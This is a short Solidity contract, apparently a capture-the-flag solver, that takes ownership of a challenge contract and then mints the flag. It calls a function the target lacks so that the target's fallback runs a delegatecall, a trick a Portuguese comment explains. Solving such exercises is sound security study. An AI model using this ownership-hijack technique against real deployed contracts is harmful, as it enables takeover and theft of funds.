// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface IChallenge7 {
    function mintFlag() external;
}

interface IDelegateLike {
    function claimOwnership() external;
}

contract Challenge7Solver {
    function takeOwnership(address challenge7) external {
        // Challenge7 não tem essa função -> cai no fallback -> delegatecall
        IDelegateLike(challenge7).claimOwnership();
    }

    function mint(address challenge7) external {
        IChallenge7(challenge7).mintFlag();
    }

    function solve(address challenge7) external {
        IDelegateLike(challenge7).claimOwnership();
        IChallenge7(challenge7).mintFlag();
    }
}
